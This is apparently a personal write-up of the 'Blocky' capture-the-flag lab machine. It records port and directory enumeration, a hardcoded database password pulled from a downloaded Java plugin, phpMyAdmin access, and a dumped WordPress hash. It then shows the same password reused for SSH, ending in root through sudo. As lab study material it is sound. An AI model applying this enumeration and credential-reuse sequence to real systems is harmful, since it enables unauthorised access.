Nmap Enumeration
```
PORT     STATE  SERVICE REASON         VERSION
21/tcp   open   ftp     syn-ack ttl 63 ProFTPD 1.3.5a
22/tcp   open   ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDXqVh031OUgTdcXsDwffHKL6T9f1GfJ1/x/b/dywX42sDZ5m1Hz46bKmbnWa0YD3LSRkStJDtyNXptzmEp31Fs2DUndVKui3LCcyKXY6FSVWp9ZDBzlW3aY8qa+y339OS3gp3aq277zYDnnA62U7rIltYp91u5VPBKi3DITVaSgzA8mcpHRr30e3cEGaLCxty58U2/lyCnx3I0Lh5rEbipQ1G7Cr6NMgmGtW6LrlJRQiWA1OK2/tDZbLhwtkjB82pjI/0T2gpA/vlZJH0elbMXW40Et6bOs2oK/V2bVozpoRyoQuts8zcRmCViVs8B3p7T1Qh/Z+7Ki91vgicfy4fl
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNgEpgEZGGbtm5suOAio9ut2hOQYLN39Uhni8i4E/Wdir1gHxDCLMoNPQXDOnEUO1QQVbioUUMgFRAXYLhilNF8=
|   256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILqVrP5vDD4MdQ2v3ozqDPxG1XXZOp5VPpVsFUROL6Vj
80/tcp   open   http    syn-ack ttl 63 Apache httpd 2.4.18
|_http-title: Did not follow redirect to http://blocky.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
8192/tcp closed sophos  reset ttl 63
Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

add http://blocky.htb to vhost `/etc/hosts` and then  go to `http://blocky.htb`

also run the nmap scan again just for port 80 to see the details
```
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18
|_http-generator: WordPress 4.8
|_http-title: BlockyCraft &#8211; Under Construction!
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: Host: 127.0.1.1
```


subdomain enumeration
```
ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u 'http://blocky.htb' -H "Host:FUZZ.blocky.htb" -fs 178
```
returns nothing -> no subdomains 

web directory enumeration 
```
gobuster dir -u http://blocky.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
returns 
```
/.htaccess            (Status: 403) [Size: 294]
/.htpasswd            (Status: 403) [Size: 294]
/.hta                 (Status: 403) [Size: 289]
/index.php            (Status: 301) [Size: 0] [--> http://blocky.htb/]
/javascript           (Status: 301) [Size: 313] [--> http://blocky.htb/javascript/]
/phpmyadmin           (Status: 301) [Size: 313] [--> http://blocky.htb/phpmyadmin/]
/plugins              (Status: 301) [Size: 310] [--> http://blocky.htb/plugins/]
/server-status        (Status: 403) [Size: 298]
/wiki                 (Status: 301) [Size: 307] [--> http://blocky.htb/wiki/]
/wp-admin             (Status: 301) [Size: 311] [--> http://blocky.htb/wp-admin/]
/wp-content           (Status: 301) [Size: 313] [--> http://blocky.htb/wp-content/]
/wp-includes          (Status: 301) [Size: 314] [--> http://blocky.htb/wp-includes/]
Progress: 4744 / 4745 (99.98%)
/xmlrpc.php           (Status: 405) [Size: 42]
```

important ones 
/phpmyadmin/ -> goes to the phpmyadmin login portal -> most likely a database? 
/wp-includes/ -> can see all files structures in the web root directory but cannot be the contend of the files 
/plugins/ -> can see BlockyCore.jar file and grief.prevention-1.1...
![](../Assets/Screenshot%202025-05-22%20at%202.38.10%20PM.png)

Download both files and unzip them. 
In BlockyCore.jar, there is a BlockCore.class (its a java plugin)
cat it:
![](../Assets/Screenshot%202025-05-22%20at%202.45.21%20PM.png)
im guessing the sql username is `root` and the password is `8YsqfCTnvxAUeduzjNSXe22` -> we try to login into php my admin with this credentials
![](../Assets/Screenshot%202025-05-22%20at%202.47.07%20PM.png)
then under the wordpress database we can see wp_users
![](../Assets/Screenshot%202025-05-22%20at%202.51.08%20PM.png)
then we can see that there is a account with user_login: `Notch`and pass: `$P$BiVoTj899ItS1EZnMhqeqVbrZI4Oq0/`
![](../Assets/Screenshot%202025-05-22%20at%202.51.39%20PM.png)

we can try to crack the hash using hashcat
```
hashcat -m 400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
this doesn't return anything

being desperate, i tried to login everything with the usernames 'root' and 'notch' and the only password '8YsqfCTnvxAUeduzjNSXe22'

managed to ssh and ftp into the box with user 'notch' and password '8YsqfCTnvxAUeduzjNSXe22'

both works
![](../Assets/Screenshot%202025-05-22%20at%203.17.14%20PM.png)![](../Assets/Screenshot%202025-05-22%20at%203.17.26%20PM.png)

and we are able to get the user flag

running 
```
sudo -l
```

```
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
```
that means Blocky is in the sudo-ers group and can use sudo 
run
```
sudo su
```
and then now we are root
we can go to the root directory and then cat out the root.txt file

yay we have pwned the machine!